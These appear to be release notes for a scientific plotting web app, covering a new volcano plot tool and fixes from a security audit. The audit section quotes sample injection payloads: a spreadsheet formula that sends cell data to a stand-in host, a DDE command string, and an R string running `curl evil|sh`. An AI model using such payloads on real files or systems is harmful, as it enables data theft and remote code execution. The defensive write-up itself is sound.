# Plöttr v1.1.0 — release notes

_Released 2026-05-03._

This release ships the eighth plot tool (Volcano), closes every Tier A item
from the 02-05-2026 security audit plus Tier B #4, and lands a pile of
quality-of-life fixes accumulated since v1.0.5.

The prose below is the long-form context — what changed, why, and how — that
historically lived inside the `CHANGELOG.md` entry. The changelog itself now
keeps one bullet per item with a link back here so the file stays scannable.

---

## ✨ Volcano Plot — eighth plot tool

Closes the long-standing `-omics` gap: every differential-expression /
proteomics / metabolomics paper ships a volcano, and Plöttr's existing scatter
tool _almost_ covered it but lacked the conventions (three-class significance
colouring, ±|log2FC| / −log10(p) reference lines, top-N feature labels with
collision-avoid layout, p = 0 clamping, ggplot2-style R export).

Folder split, mirroring boxplot/aequorin/heatmap:

- `tools/volcano/helpers.ts` — pure logic (`classifyPoint`, `computePFloor`,
  `negLog10P`, `summarize`, `autoDetectColumns`, `pickTopLabels`,
  `layoutLabels`, plus the colour/size aesthetic helpers added later in the
  branch).
- `tools/volcano/chart.tsx` — `VolcanoChart` `forwardRef` SVG renderer with
  named groups for Inkscape (`points-up` / `points-down` / `points-ns` /
  `reference-lines` / `top-n-labels`, plus `color-legend` / `size-legend`
  for the in-SVG aesthetic legends).
- `tools/volcano/reports.ts` — ggplot2-flavoured R script + classified CSV,
  both threaded through the audit-hardened `sanitizeRString` /
  `_escapeCsvCell` so a hostile feature name can't escape into live R or
  formula-evaluate in Excel.
- `tools/volcano/index.tsx` — App, steps, sidebar tiles.

Defaults: log2FC cutoff = 1, p cutoff = 0.05, palette pulled from Okabe-Ito
(`#D55E00` for up / `#0072B2` for down / `#999999` for ns — colourblind-safe
and matches the warm-up / cool-down convention every -omics paper uses).
Auto-detects DESeq2 (`log2FoldChange` / `padj`), limma (`logFC` /
`adj.P.Val`), edgeR (`logFC` / `FDR`) column conventions on first parse,
prefers adjusted p-value when both raw and adjusted exist.

p = 0 is clamped to `(min non-zero p) / 10` so the y-axis stays bounded; the
user gets a yellow notice surfacing how many features were clamped.

Top-N labelling uses a greedy collision-avoid pass over many candidate
anchors (24 angles × 4 distances) — intentionally simpler than `ggrepel`'s
force-directed simulation; falls back to a leader line when no anchor fits,
treats both data points and previously-placed leader lines as obstacles, and
gives the user independent up/down counts plus a click-to-label override.

Aesthetic mappings: optional colour-by-column and size-by-column with
auto-detected continuous-vs-discrete handling, in-SVG legends so the export
is self-contained, palette inversion (heatmap-style normal/inverted picker),
and a plot-width slider.

Wired into the landing page (8th tile), the topbar tool registry (10th
`TOOL_ORDER` entry), and the prefetch progress bar — no shape change to
those, just additions.

Coverage: 49 unit tests in `tests/volcano.test.js` + a fuzz harness
`tests/fuzz/volcano.fuzz.js` (1k iterations × 3 seeds clean — exercises
classify / summarize / pickTopLabels / layoutLabels / aesthetic helpers
under hostile inputs: NaN log2FC, p = 0, p > 1, label strings with control
chars / newlines / multi-byte unicode). Bundled demo dataset
(`tools/volcano_example.js`) is a synthetic plant-transcriptomics output
with 215 features (CCA1 / TOC1 / DREB / ABA / etc. circadian + stress hits)
plus FDR + base-mean columns so the example button shows a visually
informative volcano on first click and exercises the aesthetic mappings.

## 🔒 Security audit closeout (02-05-2026)

The full threat model lives in `docs/security_audit_02-05-2026.md`. This
release closes Tier A #1, #2, #3 and Tier B #4 — every item rated Critical
or High in the audit, plus the SRI vendor-pin.

### Tier A #1 & #2 — CSV / Excel formula injection + R-script comment escape

Both Tier A items from the threat model land here.

**#1 (CSV / Excel formula injection) — defensive escape.** `tools/shared.js`'s
`buildCsvString` now prefixes any cell whose first character is in
`[=+\-@\t\r]` with a single quote (`'`) before the RFC-4180 quote — the
standard OWASP CSV-injection mitigation. Excel / LibreOffice / Sheets read
the leading `'` as "treat as text" and silently hide it on display, so a
malicious cell like `=HYPERLINK("http://atk/x?d="&A1,…)` or
`@SUM(cmd|'/c calc'!A0)` no longer evaluates when the downloaded file is
reopened in a spreadsheet engine. Every export path inherits the fix because
they all flow through `buildCsvString` (boxplot / lineplot / scatter /
heatmap CSVs, the per-replicate Σ CSV, the calibrated-data CSV, the new
`↗ Open in Boxplot` hand-off — all of them).

Trade-off: a cell whose data legitimately starts with `=` loses that
character on round-trip if you re-import elsewhere — accepted for scientific
data per the audit. Crucial carve-out for scientific data: cells that _parse
cleanly as numbers_ via `isNumericValue` (so `-0.5`, `-1.5e3`, `-1`, `-0`,
etc.) bypass both the export prefix and the ingest scanner — Excel reads
them as numbers, not formulas, so prefixing them would silently corrupt
every dataset with negatives. Hostile leading-minus strings like
`-cmd|'/c calc'!A0` or `-2-3+10` aren't valid numbers and so still get
flagged + escaped.

**#1 — proactive ingest scan + banner.** New `scanForFormulaInjection(headers,
rows, opts)` global walks the parsed headers + cells, returns
`{ count, headers: [{idx, value}], cells: [{row, col, header, value}] }`
(example arrays capped at 8 each so the banner stays compact on huge sheets),
and is now called inside `parseRaw` / `parseData` / `parseWideMatrix` so every
plot tool's ingest gets it for free. The result is plumbed through
`usePlotToolState` (new `injectionWarning` field) and rendered by a new
shared `FormulaInjectionBanner` component in `tools/shared-ui.js`, wired into
`PlotToolShell` between the comma-fix banner and the parse-error banner.
Every plot tool sets the warning during its parse handler and clears it on
`resetAll`.

**#2 (R-script comment injection) — closing the column-name escape.**
`sanitizeRString` now also strips CR / NEL / U+2028 / U+2029 (only LF was
stripped before), and a new `sanitizeRComment` helper flattens _every_ line
terminator with a space — used inside `_headerComment` for the `dataNote`
block, inside the trailing decision-tree-rationale block, and in both
`tools/boxplot/reports.ts` and `tools/lineplot.tsx` where user-supplied set
names / x-axis labels land in `# ...` banner / comment lines. Closes the
kill chain where `setName = "foo\rsystem('curl evil|sh')"` could break out
of an R comment because R's lexer treats CR as a statement terminator.

**Demo / regression coverage.** `docs/security_test_csv_injection.csv` ships
a hostile sample (formula cells in 3 of 4 trigger flavours, plus a hostile
column name) so the banner can be exercised manually; new
`tests/formula-injection.test.js` (27 cases, including the negative-numbers
carve-out and its hostile counterparts) pins both Tier A defences.

### Tier A #3 — Anti-clickjacking frame-buster

Closes the last Tier A item from the threat model. GitHub Pages doesn't let
us set HTTP headers, so `X-Frame-Options` / `frame-ancestors` are unreachable;
the meta-tag form of `frame-ancestors` is deliberately ignored by browsers —
an inline frame-buster was the only option on this deployment shape.

A tiny inline `<style>` + `<script>` block at the top of every `<head>`
(above the theme preloader, well before any React or shared script loads)
hides the page by default via
`<style id="dv-anti-clickjack">html { visibility: hidden }</style>`; the
script reveals it only when (a) `window.top === window.self` (standalone
tab), or (b) `window.top !== window.self` AND `document.referrer` parses to
the same origin — that allowlist covers Plöttr's own landing → tool iframes
plus any sibling embed under the same GitHub Pages origin. Cross-origin
frames, empty referrers (strict referrer-policy), or malformed referrer URLs
all "fail closed": `window.stop()` halts parsing and
`document.documentElement.innerHTML` is replaced with a static "Plöttr is
being framed by an unrelated site — Open in a top-level tab" page that runs
no React, no other scripts; one click lands the user on the same URL in a
new tab.

The 10 HTML files (`index.html` + 9 `tools/*.html`) are kept byte-identical
via `scripts/anti-clickjack-sync.js` (idempotent, prettier-compatible
canonical form between BEGIN / END marker comments, `--check` mode for CI),
wired into `prebuild`, exposed as `npm run lint:anti-clickjack`, and gated
by a CI step that fails on drift.

Coverage: 10 cases in `tests/anti-clickjack.test.js` pin both layers — the
sync helper and the runtime snippet (all four reachable paths exercised
under a vm-mocked browser surface: standalone reveals, same-origin frame
reveals, cross-origin frame busts, empty-referrer busts, malformed-URL
referrer busts).

### Tier B #4 — Subresource Integrity for vendored React / ReactDOM

`vendor/react.production.min.js` and `vendor/react-dom.production.min.js`
previously shipped as plain `<script src="…">` tags across all 9
`tools/*.html` files. A malicious PR that swapped the vendor bytes — or a
force-push to `gh-pages` — would have propagated a backdoored React to
every visitor on the next page load with zero detection.

Closed by `scripts/vendor-sri.js`: computes the SHA-384 of each canonical
vendor file, walks every tool HTML, and (re-)writes
`integrity="sha384-…"` + `crossorigin="anonymous"` on the matching
`<script>` tag. Output is the canonical prettier-wrapped multi-line form so
`prettier --write` and `--check` agree. Idempotent — re-running with no
vendor changes is a no-op. Wired into `prebuild` so future vendor updates
regenerate hashes automatically; `npm run lint:sri` runs the rewriter in
`--check` mode and CI gains a "Verify vendor SRI hashes" step that fails on
drift.

Coverage: 9 cases in `tests/vendor-sri.test.js`. Same shape extends to any
future vendored asset — append the filename to the `VENDORED` array and
re-run.

### Tier 1 #1 — R-script export header brand drift

The 1.0.4 brand rename ("dataviz" / "Toolbox" → "Plöttr") swept HTML chrome
and the benchmark page generator but missed six `# Dataviz Toolbox — …`
literals embedded in the R-script-builder modules. Every R script users
downloaded for two releases — the most archive-friendly, longest-lived
export the tool produces — opened with the legacy brand.

Six spots updated: `tools/shared-r-export.js:105` (generic header),
`tools/shared-r-export.js:348` (power-analysis header),
`tools/lineplot.tsx:1127` (Line Plot), `tools/aequorin/reports.ts:197` (RLU
timecourse), `tools/boxplot/reports.ts:99` (Group Plot),
`tools/heatmap/reports.ts:62` (Heatmap). Added a regression test in
`tests/r-export.test.js` so a future rename can't drift again.

### Tier 1 #2 — `parseLatestVersion` extracted as a pure helper

The CHANGELOG → version regex (introduced to close the 1.0.5 deploy race)
was the single point of failure for every future Pages deploy showing the
right number, and had no test footprint. Refactored: the regex match is now
a pure `parseLatestVersion(content)` function, `fromChangelog` calls it
after the file read, and the disk-write side effect is gated behind
`if (require.main === module)` so the module can be `require()`-d from the
test loader without touching `tools/version.js`. New `tests/write-version.test.js`
pins the contract (8 cases).

### Tier 2 #3 — `postMessage` cross-frame channels origin-pinned

Plöttr's iframe-coordination chrome (theme sync, openTool nav for "send-to-X"
hand-offs, the Venn → UpSet payload drop) sent every `postMessage` with
`"*"` as the target origin and most receivers accepted any `e.origin`
without checking. Practical impact was low — the messages carry no secrets —
but `upset.tsx:2622` was already the only listener doing it correctly, so
the bar existed internally and the rest just hadn't caught up.

Receivers that now check `e.origin !== window.location.origin`:
`index.html:1048` (the `openTool` channel), `tools/theme.js:145` (the
`dataviz-theme-set` parent-to-iframe sync). Senders that now pin to
`window.location.origin` instead of `"*"`: `index.html:1134` (theme
broadcast), `tools/venn.tsx:441` + `:445` (Venn → UpSet payload + openTool
ask), `tools/aequorin/plot-area.tsx:435` (RLU timecourse → Boxplot openTool
ask). `file://` deploys keep working — both sides serialise to `"null"`, so
the same-origin equality holds.

### Privacy-page diagram — surface the guards inline

The "How Plöttr handles your data" diagram on `privacy.html` already showed
the data flow CSV → Plöttr → SVG / PNG / CSV / R, but the new Tier A
defences were only mentioned in trailing prose — easy to miss for a casual
reader scanning the picture. Added two compact green pills directly below
the ingress and egress arrows: "scan on import" and "sanitised export",
each with a checkmark glyph. Both pills use the theme-aware `--success-bg`
/ `--success-border` / `--success-text` palette so they read green in both
modes, and their `aria-label`s describe the full intent for screen readers.
Updated the SVG `<desc>` to mention both guards so the audio version of
the diagram tracks the visual.

## ⚙️ Quality of life & process

### `npm test` auto-bumps the landing-page test-count badge

`scripts/run-tests.js` replaces the long `node tests/x.test.js && …` chain
in `package.json#test` — runs each suite sequentially, streams stdout live,
tees the combined output to `.test-output.log` (gitignored). New
`scripts/bump-test-count.js` is wired as `posttest`; sums the `X/X passed`
lines and rewrites both badge spots in `index.html` in lockstep when they
drift. Silent on no-op, exits 0 on every degraded path. CI's badge-verify
step stays as a backstop in case the contributor forgets to commit the
auto-bumped `index.html`.

### Pre-commit hook — recovery recipe on stash-pop conflict

The hook stashes unstaged work before rebuilding compiled outputs, then
pops the stash on `EXIT`. When the pop conflicts (an outdated sourcemap
drifts from the freshly-rebuilt one) the hook correctly preserved the stash
and exited 1, but the recovery required guessing which `git checkout --ours`
/ `--theirs` orientation to use. Added six lines to the warning explaining
the common case verbatim: `git checkout --theirs <file>` → `git add <file>`
→ `git stash drop`, plus a note clarifying the orientation since it's
counter-intuitive when the stash contains the "old" copy.

### UpSet plot — degree controls switched from sliders to NumberInputs

"Minimum degree" and "Maximum degree" previously rendered as `SliderControl`s
in the Intersection-cutoff tile, inconsistent with "Minimum intersection size"
right above them which used a `NumberInput`. Swapped both for the same
pattern, added a "max in data: N" hint to **Maximum degree** (where
`N = activeSetNames.length`). The cross-clamp logic from the slider
implementation is preserved verbatim so the two values can never invert.
No `vis` shape change, no auto-prefs migration; existing saved
`dataviz-upset-prefs` rehydrate unchanged.

### RLU timecourse → Boxplot hand-off

A user who wants to render the Σ barplot as a boxplot / violin / raincloud
no longer has to download → switch tools → drag-drop → walk configure step.
New button next to "⬇ CSV" in the per-replicate panel bundles the same data
into an in-memory CSV and hands it off via a tiny new shared module
`tools/shared-handoff.js` (`setHandoff(payload)` / `consumeHandoff(targetTool)`,
round-tripped through `localStorage` under `dataviz-handoff`, one-shot,
cleared on read). Boxplot consumes the payload at mount time (standalone)
or on `storage` event (embedded), skipping its own configure step. The
hand-off helper is intentionally tool-agnostic — any tool can opt in by
calling `setHandoff({tool: "scatter", csv, …})`.

### Landing page — plot tiles arranged 4×2

Eight plot tools pushed the previous 2-column tile layout into a 4-row
vertical column that scrolled awkwardly on standard laptop displays.
Switched the `.tiles` default grid to `repeat(4, 150px)` so the eight plot
tools sit as a 4×2 block (~636px wide). The calculators group keeps its
2-wide shape via a new `.tiles-narrow` modifier. Below 700px both groups
collapse to 2-up so phones don't horizontal-scroll.

### `scripts/write-version.js` reads from `CHANGELOG.md` instead of `git describe`

Symptom: after pushing `chore(release): 1.0.5` followed by
`git push origin v1.0.5`, the deployed `tools/version.js` on `gh-pages` still
showed `v1.0.4`. Root cause: the deploy workflow's `npm run build` runs
`prebuild` → `scripts/write-version.js`, which called `git describe --tags
--abbrev=0`. At workflow-trigger time the tag hadn't reached the GitHub side
yet (it pushes a few seconds after the master push), so `git describe`
returned the _previous_ release tag and the build overwrote the hand-set
`v1.0.5` with `v1.0.4`. Fix: `write-version.js` now derives the version from
the first concrete (non-`Unreleased`) `## [X.Y.Z] - DATE` heading in
`CHANGELOG.md` — that file is bumped synchronously with the release commit,
so it's deterministic regardless of tag-push timing — and falls back to
`git describe` then to `"dev"` if CHANGELOG is missing or malformed.
